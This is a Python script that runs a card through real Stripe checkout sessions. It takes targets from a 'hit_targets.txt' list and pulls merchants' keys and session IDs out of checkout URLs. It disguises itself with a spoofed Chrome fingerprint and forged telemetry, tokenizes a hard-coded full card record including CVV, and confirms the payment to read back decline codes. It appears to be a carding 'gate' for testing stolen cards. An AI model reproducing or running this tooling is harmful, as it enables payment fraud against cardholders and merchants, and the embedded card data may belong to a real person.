# -*- coding: utf-8 -*-
import asyncio, os, sys, json, uuid
sys.stdout.reconfigure(encoding='utf-8')
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession
import stripe_fid, gate_client as gc

urls = [u.strip() for u in open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'data', 'hit_targets.txt'), encoding='utf-8') if 'b1ZbS5vKDpb' in u]
URL = urls[0]

async def main():
    d = stripe_fid.decode_fragment(URL)
    pk, cs = d['apiKey'], d['checkoutSessionId']
    async with AsyncSession(impersonate='chrome131', verify=False) as s:
        H = {'Origin': 'https://js.stripe.com', 'Referer': 'https://js.stripe.com/', 'Accept': 'application/json'}
        r = await s.get(f'https://api.stripe.com/v1/payment_pages/{cs}', params={'key': pk}, headers=H, timeout=12)
        data = r.json()
        checksum = data.get('init_checksum')
        amount = (data.get('payment_intent') or {}).get('amount')
        telem = gc.stripe_telemetry('https://checkout.stripe.com', pk)
        card = gc.parse_card('4937241006643332|02|31|275')
        r2 = await s.post('https://api.stripe.com/v1/payment_methods', data=gc.tokenize_body(card, telem, 'https://checkout.stripe.com'), headers=gc.TOKENIZE_HEADERS, timeout=10)
        pm = r2.json()['id']
        r3 = await s.post(f'https://api.stripe.com/v1/payment_pages/{cs}/confirm',
                          data={'key': pk, 'eid': str(uuid.uuid4()), 'payment_method': pm,
                                'expected_payment_method_type': 'card', 'expected_amount': str(amount),
                                'init_checksum': checksum, 'return_url': URL.split('#')[0]}, headers=H, timeout=20)
        print('HTTP:', r3.status_code)
        d3 = r3.json()
        print('keys:', sorted(d3.keys())[:20])
        print('status:', d3.get('status'), '| payment_status:', d3.get('payment_status'))
        pi = d3.get('payment_intent') or {}
        print('PI:', pi.get('id'), pi.get('status'), '| last_error:', (pi.get('last_payment_error') or {}).get('decline_code'))
        print('submit_type:', d3.get('submit_type'))

asyncio.run(main())